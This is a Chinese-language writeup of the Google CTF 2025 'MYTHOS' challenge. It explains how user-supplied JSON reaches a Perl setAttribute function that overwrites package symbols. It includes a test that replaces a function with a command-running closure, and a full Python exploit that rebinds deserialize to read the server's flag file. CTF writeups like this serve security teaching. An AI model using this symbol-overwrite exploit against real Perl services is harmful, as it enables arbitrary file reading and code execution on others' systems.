---
title: GoogleCTF 2025 MYTHOS Writeup
date: 2025-07-01
last_modified_at: 2025-07-01 17:30:00 +0800
categories: [CTF]
tags: [perl]
pin: false
math: true
mermaid: true
image:
  path: /assets/images/Google-CTF-2025.png
toc: true

---

Google CTF 2025 中一道涉及 perl 符号覆盖的题目。一个比较典型的示例如下， setAttribute 函数可以动态地设置包中变量甚至函数。如果 `$dst` 或 `$key_name` 可控，攻击者可以覆盖任意包下的符号，甚至系统内置包（如 CORE、UNIVERSAL 等）。
```perl
sub setAttribute {
    my $dst = shift;         # 目标包名
    my $key_name = shift;    # 变量或子程序名
    my $value_ref = shift;   # 引用（如变量引用或代码引用）
    if (!defined $key_name || $key_name eq '' || !defined $value_ref) {
        return 0;
    }
    no strict 'refs';        # 关闭符号引用严格检查
    *{"$dst"."::$key_name"} = $value_ref;  # 动态设置符号表
    use strict 'refs';       # 恢复严格检查
    return 1;
}
```
下面仅对 perl 部分的内容进行记录。

## 赛题简介
> Legends tell of a far away kingdom in a far away land, of a far away guardian and a far away princess. Explore the myth at your leisure.

赛题附件：[attachment](/assets/archives/26b09c42c9337d4811b19de5861a2dd33a05677dfb9361ee0b7379a089323ef24653d98cb4b104d77141386a38f78d166bfd3ec934dbc9fe18a030355dcfbecd.zip)

题目给出了两个服务，前端使用 python，后端使用 perl。可以编写一个 docker-compose.yaml 方便启动。
```yaml
version: '3.8'

services:
  # Perl 后端服务 (游戏逻辑)
  perl-backend:
    build:
      context: ./perl
      dockerfile: Dockerfile
    container_name: googlectf-2025-mythos-perl
    ports:
      - "5000:1338"  # 将容器的1338端口映射到主机的5000端口
    networks:
      - mythos-network
    restart: unless-stopped

  # Python 前端服务 (Web界面)
  python-frontend:
    build:
      context: ./py
      dockerfile: Dockerfile
    container_name: googlectf-2025-mythos-python
    ports:
      - "1337:1337"  # 将容器的1337端口映射到主机的1337端口
    environment:
      - GAME_URL=http://perl-backend:1338/  # 指向Perl后端服务
    networks:
      - mythos-network
    depends_on:
      - perl-backend
    restart: unless-stopped

networks:
  mythos-network:
    driver: bridge 
```
整体服务架构：
```bash
┌─────────────────┐    HTTP     ┌──────────────────┐
│                 │   Requests  │                  │
│ Python Frontend │────────────▶│  Perl Backend    │
│   (Flask)       │             │  (Dancer2)       │
│   Port: 1337    │             │  Port: 1338      │
└─────────────────┘             └──────────────────┘
```
服务启动后还尝试搭建远程调试环境，因为对 perl 不够熟悉，始终没有成功。IDEA 中可以安装一个 Perl Debugger 插件

- [Perl Debugger · Camelcade/Perl5-IDEA Wiki](https://github.com/Camelcade/Perl5-IDEA/wiki/Perl-Debugger)

![](assets/2025-07-01-15-01-53.png)

在 docker 中启动服务前，添加环境变量指定一些调试选项。
```bash
# in container
export PERL5_DEBUG_ROLE=client
export PERL5_DEBUG_HOST=192.168.85.1 # idea locaiton
export PERL5_DEBUG_PORT=9000
export PLACK_ENV=development
perl -d:Camelcadedb /usr/local/bin/plackup -p 1339 bin/app.psgi
```
运行起来后，发现 perl 执行的部分确实可以断下，但是 plackup 管理的 web 应用断不下来，遂放弃。因此只能多输出一些调试信息来辅助分析。

为了不影响容器运行，可以修改代码之后再另外一个端口运行新的服务，然后将容器内的 1339 端口映射出来。
```bash
plackup -p 1339 bin/app.psgi
ssh -N -L 1339:172.22.0.2:1339 dumkiy@192.168.85.128
```

## 分析
### 后端 perl 
Perl 后端使用 Dancer2 框架构建，作为游戏逻辑的核心服务，主要功能位于 lib 目录：
```bash
.
├── bin
│   └── app.psgi
├── config.yml
├── data
│   ├── angels_scarf.txt
│   ├── events.json
│   ├── mermaid_scale.txt
│   ├── mew_plaque.txt
│   └── mimic_gem.txt
├── flag.txt
└── lib
    ├── Game.pm
    ├── Inventory.pm
    └── Mythos.pm
```
1. Game.pm：游戏状态管理
2. Inventory.pm：物品系统
3. Mythos.pm：事件系统

API 接口主要有三个：
1. /game - 创建新游戏。
   1. 输入: `{"name": "玩家名"}`，
   2. 输出: `游戏初始状态 + 第一个事件信息`
2. /event - 处理玩家选择
   1. 输入: `{"name": "玩家名", "choice": 选择ID, "items": "Base64 编码的物品JSON"}`
   2. 输出: 下一个事件信息 + 可能的物品奖励

游戏的 data/events.json 内存放了所有的事件信息，其中 ev_choice.goto 值代表选择该 event 后会进入的 event id 号。

```json
{
    "events": [
        {
            "ev_id": 0,
            "ev_name": "The Antechamber",
            "ev_content": "You find yourself in a large foyer, with marble walls and glass columns. Red velvet adorns most surfaces, leading up to an arched gate at the end of the room. Alternatively, one of the many ceiling-high windows is available to jump out into the courtyard below.",
            "ev_choice": [
                {
                    "id": 0,
                    "goto": 9,
                    "desc": "Go through the arched doors"
                },
                {
                    "id": 1,
                    "goto": 1,
                    "desc": "Go out the window"
                }


            ]
        },
```
当进入 id 为 20 的 event 时，会进入一个物品检查点：
```perl
if ($game->currEv() == 20) {
    # 反序列化玩家物品
    my $stats = deserialize(decode_json(decode_base64($items)));
    
    # 检查是否拥有所有4个物品
    if ($game->{inventory}->hasAllItems($game_artifacts) == 1) {
        $next_ev = $all_events->{21};  # GOOD END
    } else {
        $next_ev = $all_events->{22};  # BAD END
    }
}
```
如果玩家具备所有的物品，则会进入 GOOD END，反之进入 BAD END。这都不重要，重要的是，deserialize 函数调用的 copyItems 函数，会使用 setAttribute 函数来设置对象属性。

```perl
    sub deserialize {
        my $items = shift;  # 获取物品数据哈希引用
        my $inv = new Inventory();  # 创建新的Inventory对象
        my $final_score = copyItems($inv, $items);  # 复制物品数据到Inventory对象
        return $final_score;  # 返回更新后的Inventory对象
    }

        # 复制物品
    # 参数1：目标哈希引用
    # 参数2：源哈希引用
    # 返回：更新后的目标哈希引用
    sub copyItems {
        my $dst = shift;  # 获取目标哈希引用
        my $src = shift;  # 获取源哈希引用
        foreach my $key (keys %$src) {  # 遍历源哈希的所有键
            if (defined $dst->{$key} && ref $dst->{$key} eq 'HASH' && ref $src->{$key} eq 'HASH') {
                copyItems($dst->{$key}, $src->{$key});  # 递归复制嵌套哈希
            } elsif (!defined $dst->{$key}) {
                if (ref $src->{$key} ne 'HASH') {
                    $dst->{$key} = $src->{$key};  # 复制非哈希值
                } else {
                    foreach my $inner_key (keys %{$src->{$key}}) {
                        my $index = $src->{$key}->{$inner_key};
                        setAttribute($key, $inner_key, $game_artifacts->{$index});  # 设置物品属性
                    }
                }
            } elsif (defined $dst->{$key} && ref $dst->{$key} ne 'HASH') {
                $dst->{$key} = $src->{$key};  # 更新非哈希值
            }
        }
        return $dst;  # 返回更新后的目标哈希
    }
```

但 setAttribute 函数存在一定安全风险，可以动态地向 Perl 包中添加符号（函数、变量、常量等）。

```perl
    # 设置属性
    # 参数1：目标包名
    # 参数2：键名
    # 参数3：值引用
    # 返回：成功返回1，失败返回0
    sub setAttribute {
        my $dst = shift;  # 获取目标包名
        my $key_name = shift;  # 获取键名
        my $value_ref = shift;  # 获取值引用
        if (!defined $key_name || $key_name eq '' || !defined $value_ref) {
            return 0;  # 参数无效，返回失败
        }
        no strict 'refs';  # 暂时禁用严格引用检查
        *{"$dst"."::$key_name"} = $value_ref;  # 设置符号表条目
        use strict 'refs';  # 重新启用严格引用检查
        return 1;  # 返回成功
    }
```

我们可以将 setAttribute 函数拿出来单独进行测试：
```perl
package Test;
use File::Slurp; 
use Data::Dumper;
use JSON;

sub deserialize {
    print "deserialize\n";
}

sub setAttribute {
        my $dst = shift;
        my $key_name = shift;
        my $value_ref = shift;
        if (!defined $key_name || $key_name eq '' || !defined $value_ref) {
            return 0;
        }
        no strict 'refs';
        *{"$dst"."::$key_name"} = $value_ref;
        use strict 'refs';
        return 1;
    }
    
my $b = sub { print "execute!\n"; system('echo execute! > /tmp/pwned'); };
setAttribute("Test", 'deserialize', $b);
setAttribute("Test", 'hasAllItems', $b);

deserialize()
```
运行时 deserialize 会被替换为命令执行函数。
```bash
root@137d18add044:/home/mythos# perl test/test_temp.pl 
execute!
root@137d18add044:/home/mythos# ls /tmp/pwned
/tmp/pwned
```

这道题在调用 setAttribute 时第三个参数限定为 $game_artifacts 中的属性或方法。
```perl
setAttribute($key, $inner_key, $game_artifacts->{$index});
```
而 game_artifacts 的 item_delegate 属性是一个匿名函数，并且可以调用 read_file 读取文件。并将 desc 设置为文件内容进行返回。
```perl
my $game_artifacts = {
    item_delegate    => sub {
                            my $obj = shift; 
                            if (defined $obj->{desc_filename}) {
                                $obj->{desc} = read_file($obj->{desc_filename});
                                return {
                                    name=>$obj->{name},
                                    desc=>$obj->{desc}
                                    };
                                } return $obj;
    mermaid_scale     => {
        name=>"Mermaid Scale",
        desc_filename=>"./data/mermaid_scale.txt"
    },  # 美人鱼鳞片物品定义
    angels_scarf      => {
        name=>"Angel Scarf",
        desc_filename=>"./data/angels_scarf.txt"
    },  # 天使围巾物品定义
    mew_plaque      => {
        name=>"Mew Plaque",
        desc_filename=>"./data/mew_plaque.txt"
    },  # 缪牌匾物品定义
    mimic_gem      => {
        name=>"Mimic Gem",
        desc_filename=>"./data/mimic_gem.txt"
    }  # 拟态宝石物品定义
};
```
因此，我们可以考虑将应用中的某个方法覆盖为 `$game_artifacts.item_delegate`，调用时传入 flag 文件路径，就可以读取 flag。

/event 路由中，deserialize 的参数是从请求参数 items 中获取，用户可控，并且其返回结果 `$stats` 最终会拼接进入 `$results`，因此可以考虑覆盖 deserialize 函数。
```perl
post '/event' => sub { 
    ...
    if ($game->currEv() == 20) {
        # 反序列化Base64编码的物品数据
        my $stats = deserialize(decode_json(decode_base64(body_parameters->get('items'))));
        $stats->{Game} = $player_name;                   # 设置游戏标识
        $game->{inventory} = $stats;                     # 设置游戏物品栏
        # 检查是否收集了所有物品
        if ($game->{inventory}->can("hasAllItems")) {
            ...
        }
    }
    
    # 构建响应数据
    my $results = {
            success => 1,
            player => $player_name,
            ev_title => $next_ev->{ev_name},      # 事件标题
            ev_desc => $next_ev->{ev_content},    # 事件描述
            ev_choice => $next_ev->{ev_choice}    # 事件选择项
        };
    # 如果事件包含物品奖励，添加到响应中
    if (defined $next_ev->{ev_item}) {
            ev_title => $next_ev->{ev_name},
            ev_desc => $next_ev->{ev_content},
            ev_choice => $next_ev->{ev_choice}
        };
        if (defined $next_ev->{ev_item}) {
            $results->{ev_item} = $next_ev->{ev_item};
        }
        if (defined $game->{inventory}) {
            foreach my $key (keys %{$game->{inventory}}) {
                $results->{items}->{$key} = $game->{inventory}->{$key};
            }
        }
        return $results;
};
```
poc 如下：
```py
import requests
import base64
import json
import random
import string
import time

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def beautify_json(data):
    # return
    data = json.loads(data)
    print(json.dumps(data, indent=4))

def gen_random(len):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(len))

sess = requests.Session()
sess.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
sess.verify = False

url = "http://localhost:1339"

name = gen_random(10)

def start_game():
    data = {
        "name":name
    }

    res = sess.post(url + '/game', json=data)
    beautify_json(res.text)

def send_event(choice):
    data = {
        "items": "",
        "name":name,
        "choice": choice
    }
    res = sess.post(url + '/event', json=data)
    beautify_json(res.text)

def send_payload(target_package, target_func):
    payload = {
        "mermaid_scale": 1,
        "angels_scarf": 1,
        "mew_plaque": 1,
        target_package:{
            target_func: "item_delegate"
        },
    }

    b64_items = base64.b64encode(json.dumps(payload).encode()).decode()

    data = {
        "items": b64_items,
        "name":name,
        "choice": 0
    }
    res = sess.post(url + '/event', json=data)
    beautify_json(res.text)

def trigger():
    payload = {
        "desc_filename":"/home/mythos/flag.txt",
        "name": "FakeInventory",
    }

    b64_items = base64.b64encode(json.dumps(payload).encode()).decode()
    
    data = {
        "name":name,
        "items": b64_items,
        "choice": 0
    }
    res = sess.post(url + '/event', json=data)
    beautify_json(res.text)


if __name__ == "__main__":
    start_game()
    send_event(0)
    send_event(0)
    send_event(0)
    send_payload("Mythos", "deserialize")
    trigger()
```
但测试发现会出现如下的报错：
```bash
[Mythos:29821] error @2025-07-01 07:42:49> Route exception: Can't call method "can" on unblessed reference at /home/mythos/bin/../lib/Mythos.pm line 186. in /usr/local/lib/perl5/site_perl/5.40.2/Dancer2/Core/App.pm l. 1538
```
deserialize 函数被覆盖之后返回的是一个 hash 表，而不是一个对象，因此不能调用 can 方法，从而产生报错，导致程序无法继续运行。
```perl
if ($game->{inventory}->can("hasAllItems")) {
```
这个问题是当时面临的最大困难，既然 setAttribute 可以覆盖任意函数，本人尝试了多种思路：
1. 修改 Dancer2 内部的 json 序列化器：`JSON::XS` 的 encode 方法，确实能够劫持 json 输出，但由于 Dancer2 框架本身在调用 encode 时，使用的是 JSON()->new->encode 这样的形式调用，以对象的形式调用函数时，传入的第一个参数会是对象本身，这样一来 item_delegate 就接收不到我们传入的参数，因此无论传入什么参数，都会导致返回值为空。
2. 修改异常处理，跳过 can 方法异常。比如 `Dancer2::Core::Error` 的 _censor 方法。但总会出现其他类型的报错。

最终发现只需要多发一次包，不进入事件 20 就可以获取 flag：
```py
    start_game()
    send_event(0)
    send_event(0)
    send_event(0)
    send_payload()  # 覆盖 deserialize
    trigger(0)      # 进入事件 20 调用覆盖后的 deserialize
    trigger(1)      # 不进入事件 20，获取结果
```
这是为什么呢？在 trigger(0) 时，获取到的 flag 会保存道 `$game->{inventory}` 中

```perl
    my $stats = deserialize($json_items);
    $stats->{Game} = $player_name;
    $game->{inventory} = $stats;
```

由于 `$game` 来自于 `$curr_games{$player_name}`，包级变量 `%curr_games` 会一直保留。即使后方的 can 函数调用会导致报错无法回显，flag 依然是保存在其中。
```perl
my %curr_games;  # 存储当前游戏会话的哈希
...
post '/game' => sub {
    my $player_name = (body_parameters->get('name'));  # 获取玩家名称
    my $game = new Game();  # 创建新的Game对象
    $curr_games{$player_name} = $game;  # 将Game对象存储到当前游戏会话哈希中
    ...
};
...
my $game = $curr_games{$player_name};
```
因此再次触发一个不进入 20 的 event 即可拿到 flag。

## 最终 EXP

```python
import requests
import base64
import json
import random
import string
import time

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def beautify_json(data):
    data = json.loads(data)
    print(json.dumps(data, indent=4))

def gen_random(len):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(len))

sess = requests.Session()
sess.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
sess.verify = False

url = "http://localhost:1339"

name = gen_random(10)

def start_game():
    data = {
        "name":name
    }

    res = sess.post(url + '/game', json=data)
    beautify_json(res.text)

def send_event(choice):
    data = {
        "items": "",
        "name":name,
        "choice": choice
    }
    res = sess.post(url + '/event', json=data)
    beautify_json(res.text)

def send_payload():
    payload = {
        "mermaid_scale": 1,
        "angels_scarf": 1,
        "mew_plaque": 1,
        "mimic_gem": 1,
        "Mythos":{
            "deserialize":"item_delegate"
        }
    }

    b64_items = base64.b64encode(json.dumps(payload).encode()).decode()

    data = {
        "items": b64_items,
        "name":name,
        "choice": 0
    }
    res = sess.post(url + '/event', json=data)
    beautify_json(res.text)

def trigger(choice):
    payload = {
        "desc_filename":"flag.txt"
    }

    b64_items = base64.b64encode(json.dumps(payload).encode()).decode()
    
    data = {
        "name":name,
        "items": b64_items,
        "choice": choice
    }
    res = sess.post(url + '/event', json=data)
    beautify_json(res.text)

if __name__ == "__main__":
    start_game()
    send_event(0)
    send_event(0)
    send_event(0)
    send_payload()
    trigger(0)
    trigger(1)
```